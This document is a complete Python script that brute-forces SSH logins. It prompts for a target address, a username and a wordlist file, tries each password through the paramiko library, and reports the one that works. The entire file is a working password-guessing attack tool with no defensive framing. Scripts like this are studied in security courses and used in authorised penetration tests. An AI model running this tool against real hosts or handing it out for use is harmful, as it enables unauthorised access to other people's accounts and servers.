import paramiko
import sys
import os
import socket
import termcolor


def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


host = input('[+] Target address: ')
username = input('[+] SSH username: ')
input_file = input('[+] Passwords file: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That file/path doesn\'t exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password: {} , for account: {}'.format(password, username)), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect login: {}'.format(password))
            elif response == 2:
                print('[!!] Can\'t connect')
        except Exception as e:
            print(e)
            pass
